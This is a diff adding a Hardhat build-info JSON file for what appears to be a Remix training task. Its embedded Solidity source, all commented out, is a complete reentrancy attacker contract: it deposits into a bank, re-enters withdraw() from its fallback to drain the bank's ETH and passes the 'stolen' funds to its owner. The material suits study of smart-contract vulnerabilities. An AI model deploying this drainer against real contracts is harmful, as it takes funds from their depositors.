@@ -1,0 +1,69 @@
+{
+	"id": "a50092a5228ca2badf9a401f20c57151",
+	"_format": "hh-sol-build-info-1",
+	"solcVersion": "0.8.34",
+	"solcLongVersion": "0.8.34+commit.80d5c536",
+	"input": {
+		"language": "Solidity",
+		"sources": {
+			"remix-phase-2/task77.sol": {
+				"content": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.20;\r\n\r\n// interface IVulnerableBank {\r\n//     function withdraw(uint256 amount) external;\r\n//     function deposit() external payable;\r\n// }\r\n\r\n// /*\r\n// =========================================================\r\n// ATTACK CONTRACT\r\n// =========================================================\r\n// */\r\n\r\n// contract ReentrancyAttackerVul {\r\n\r\n//     IVulnerableBank public bank;\r\n//     address public owner;\r\n\r\n//     uint256 public attackAmount;\r\n//     bool public attacking;\r\n\r\n//     constructor(address _bank) {\r\n//         bank = IVulnerableBank(_bank);\r\n//         owner = msg.sender;\r\n//     }\r\n\r\n//     /*\r\n//     =====================================================\r\n//     START ATTACK\r\n//     =====================================================\r\n//     */\r\n\r\n//     function attack() external payable {\r\n//         require(msg.sender == owner, \"Only owner\");\r\n\r\n//         /*\r\n//             Store attack amount\r\n//         */\r\n//         attackAmount = msg.value;\r\n\r\n//         /*\r\n//             Step 1:\r\n//             Deposit ETH into vulnerable bank\r\n//         */\r\n//         bank.deposit{value: msg.value}();\r\n\r\n//         /*\r\n//             Step 2:\r\n//             Start withdrawal (triggers reentrancy)\r\n//         */\r\n//         attacking = true;\r\n//         bank.withdraw(msg.value);\r\n//         attacking = false;\r\n//     }\r\n\r\n//     /*\r\n//     =====================================================\r\n//     FALLBACK FUNCTION (REENTRANCY POINT)\r\n//     =====================================================\r\n//     */\r\n\r\n//     fallback() external payable {\r\n\r\n//         /*\r\n//         =================================================\r\n//         CRITICAL REENTRANCY LOOP\r\n//         =================================================\r\n\r\n//         This runs when bank sends ETH back.\r\n\r\n//         BEFORE bank updates balance,\r\n//         attacker re-enters withdraw().\r\n//         */\r\n\r\n//         if (attacking) {\r\n\r\n//             uint256 bankBalance =address(bank).balance;\r\n\r\n//             /*\r\n//                 Continue attacking while bank has funds.\r\n//             */\r\n//             if (bankBalance >= attackAmount) {\r\n\r\n//                 bank.withdraw(attackAmount);\r\n//             }\r\n//         }\r\n//     }\r\n\r\n//     /*\r\n//     =====================================================\r\n//     COLLECT STOLEN ETH\r\n//     =====================================================\r\n//     */\r\n\r\n//     function withdrawStolen() external {\r\n//         require(msg.sender == owner, \"Only owner\");\r\n\r\n//         payable(owner).transfer(address(this).balance);\r\n//     }\r\n\r\n//     /*\r\n//     =====================================================\r\n//     VIEW CONTRACT BALANCE\r\n//     =====================================================\r\n//     */\r\n\r\n//     function getBalance()\r\n//         external\r\n//         view\r\n//         returns (uint256)\r\n//     {\r\n//         return address(this).balance;\r\n//     }\r\n// }\r\n"
+			}
+		},
+		"settings": {
+			"optimizer": {
+				"enabled": false,
+				"runs": 200
+			},
+			"outputSelection": {
+				"*": {
+					"": [
+						"ast"
+					],
+					"*": [
+						"abi",
+						"metadata",
+						"devdoc",
+						"userdoc",
+						"storageLayout",
+						"evm.legacyAssembly",
+						"evm.bytecode",
+						"evm.deployedBytecode",
+						"evm.methodIdentifiers",
+						"evm.gasEstimates",
+						"evm.assembly"
+					]
+				}
+			},
+			"remappings": []
+		}
+	},
+	"output": {
+		"sources": {
+			"remix-phase-2/task77.sol": {
+				"ast": {
+					"absolutePath": "remix-phase-2/task77.sol",
+					"exportedSymbols": {},
+					"id": 2,
+					"license": "MIT",
+					"nodeType": "SourceUnit",
+					"nodes": [
+						{
+							"id": 1,
+							"literals": [
+								"solidity",
+								"^",
+								"0.8",
+								".20"
+							],
+							"nodeType": "PragmaDirective",
+							"src": "33:24:0"
+						}
+					],
+					"src": "33:2970:0"
+				},
+				"id": 0
+			}
+		}
+	}
+}
